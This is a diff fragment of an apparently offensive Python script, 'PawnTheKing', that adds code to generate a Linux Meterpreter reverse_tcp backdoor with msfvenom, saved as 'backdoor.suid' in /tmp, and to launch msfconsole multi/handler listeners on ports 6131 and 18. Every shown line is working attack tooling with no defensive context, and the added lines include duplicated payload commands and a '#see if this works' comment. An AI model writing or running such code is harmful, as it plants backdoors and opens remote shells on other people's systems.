@@ -27,6 +27,26 @@ subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST
 
 subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST={0}".format(IP), "PORT=18", "-f", "elf", "-o", "/tmp/PawnTheKing/backdoor.suid"]), stderr=DEVNULL)
 
+
+#see if this works
+
+subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST={0}".format(IP), "PORT=18", "-f", "elf", "-o", "/tmp/PawnTheKing/backdoor.suid"]), stderr=DEVNULL)
+
+subprocess.Popen((["msfvenom", "-p", "linux/x86/meterpreter/reverse_tcp", "LHOST={0}".format(IP), "PORT=18", "-f", "elf", "-o", "/tmp/PawnTheKing/backdoor.suid"]), stderr=DEVNULL)
+
+def subprocess_cmd(command):
+    process = subprocess.Popen(command,stdout=subprocess.PIPE, shell=True)
+    proc_stdout = process.communicate()[0].strip()
+
+subprocess_cmd("msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LPORT 6131; run -j; exit -y'")
+
+
+subprocess_cmd("msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LPORT 18; run -j; exit -y'")
+
+
+#OR
+#subprocess_cmd("msfconsole -q -x 'use exploit/multi/handler;set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LPORT 6131; run;set LPORT 18; exit -y'")
+
 tmpdir = os.path.join(os.path.dirname("/tmp/PawnTheKing"))
 os.chdir(tmpdir)
 
